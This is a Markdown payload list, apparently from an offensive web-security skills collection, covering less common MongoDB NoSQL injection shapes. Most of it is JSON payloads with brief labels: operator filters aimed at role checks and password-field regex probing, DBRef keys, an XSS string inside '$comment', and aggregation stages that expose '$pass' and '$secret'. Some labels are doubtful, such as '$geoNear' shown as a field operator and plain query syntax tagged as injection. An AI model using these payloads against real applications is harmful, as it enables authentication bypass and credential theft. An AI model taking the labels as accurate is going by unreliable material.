# Extended corpus — the less-common NoSQLi shapes

## The `.`-key — the dotted-path injection

```json
{"profile.role": {"$ne": "user"}}
{"meta.flag": {"$exists": true}}
{"settings.admin": true}
{"credentials.pass": {"$regex": "^a"}}
{"0.user": {"$ne": null}}
{"items.0.price": {"$gt": 100}}
{"items.$.price": {"$gt": 100}}
```

The `.`-key — Mongo reads `a.b` as a dotted-path — `filter-bypass.md`.

## The `$`-inside-key — `{"user.$ref": ...}`

```json
{"user.$ref": "x"}
{"$ref": "users"}
{"$id": "..."}
{"$db": "admin"}
```

`$ref`/`$id`/`$db` — the DBRef-keys — a DBRef-injection.

## The `$` in the array-position — `{"items.$": ...}`

```json
{"items.$": "x"}
{"items.$.price": 100}
{"items.$[].price": 100}
{"items.$[elem].price": 100}
```

`$`/`$[]`/`$[elem]` — the positional operators — the array-position
injection.

## The `$comment` — the log-injection

```json
{"user": "admin", "$comment": "injection-marker"}
{"$comment": "request-id: 123"}
{"$comment": "<script>alert(1)</script>"}
```

`$comment` — attaches a comment — the log/profiler fingerprint —
the stored-XSS-adjacent — `skills/web-xss/`.

## The `$text`/`$search` — the text-search

```json
{"$text": {"$search": "admin"}}
{"$text": {"$search": "\"flag\""}}
{"$text": {"$search": "flag", "$caseSensitive": true}}
{"$text": {"$search": "flag", "$language": "en"}}
{"$text": {"$search": "flag", "$diacriticSensitive": true}}
```

`$text` — needs a text-index — `operators.md`.

## The `$geo*` — the geospatial

```json
{"loc": {"$near": [0, 0]}}
{"loc": {"$geoWithin": {"$box": [[0,0], [1,1]]}}}
{"loc": {"$geoIntersects": {"type": "Point", "coordinates": [0, 0]}}}
{"loc": {"$nearSphere": [0, 0]}}
{"loc": {"$geoNear": {"near": [0,0], "distanceField": "d"}}}
```

The `$geo*` family — geospatial — a fingerprint/injection.

## The `$slice` — the array-slice

```json
{"items": {"$slice": 5}}
{"items": {"$slice": [0, 5]}}
{"items": {"$slice": -5}}
```

`$slice` — the array-slice — a projection-injection.

## The `$elemMatch` — the subdoc-filter

```json
{"items": {"$elemMatch": {"price": {"$gt": 100}}}}
{"items": {"$elemMatch": {"name": {"$regex": "^flag"}}}}
{"items": {"$elemMatch": {"name": "x", "price": {"$gt": 0}}}}
{"items": {"$elemMatch": {"$and": [{"a": 1}, {"b": 2}]}}}
{"items": {"$elemMatch": {"$or": [{"a": 1}, {"b": 2}]}}}
{"items": {"$elemMatch": {"name": {"$in": ["a", "b"]}}}}
```

`$elemMatch` — the array-element filter — `operators.md`.

## The `$cond`/`$ifNull` — the conditional-expressions

```json
[{"$project": {"x": {"$cond": [{"$eq": ["$user", "admin"]}, "yes", "no"]}}}]
[{"$project": {"x": {"$ifNull": ["$flag", "none"]}}}]
[{"$project": {"x": {"$ifNull": ["$secret", "none"]}}}]
```

`$cond`/`$ifNull` — the conditional — the field-fallback — `aggregation.md`.

## The `$let` — the variable-binding

```json
[{"$project": {"x": {"$let": {"vars": {"p": "$pass"}, "in": {"$eq": ["$$p", "x"]}}}}}]
```

`$let` — the variable-binding — the expression-scope.

## The `$map`/`$filter`/`$reduce` — the array-expressions

```json
[{"$project": {"x": {"$map": {"input": "$items", "as": "i", "in": "$$i.price"}}}}]
[{"$project": {"x": {"$filter": {"input": "$items", "as": "i", "cond": {"$gt": ["$$i.price", 0]}}}}}]
[{"$project": {"x": {"$reduce": {"input": "$items", "initialValue": 0, "in": {"$add": ["$$value", "$$this"]}}}}}]
```

`$map`/`$filter`/`$reduce` — the array-expressions — `aggregation.md`.

## The `$dateFromString`/`$toDate` — the type-conversion

```json
[{"$project": {"x": {"$dateFromString": {"dateString": "$created"}}}}]
[{"$project": {"x": {"$toDate": "$created"}}}]
```

The type-conversion — `aggregation.md`.

## The `$convert`/`$toString`/`$toInt` — the coercion

```json
[{"$project": {"x": {"$toString": "$pass"}}}]
[{"$project": {"x": {"$toInt": "$id"}}}]
[{"$project": {"x": {"$convert": {"input": "$pass", "to": "string"}}}}]
[{"$project": {"x": {"$toObjectId": "$_id"}}}]
```

The coercion — `aggregation.md`.

## The `$graphLookup` — the recursive-join

```json
[{
  "$graphLookup": {
    "from": "users",
    "startWith": "$user_id",
    "connectFromField": "user_id",
    "connectToField": "_id",
    "as": "chain"
  }
}]
```

`$graphLookup` — the recursive-join — the cross-collection chain —
`aggregation.md`.
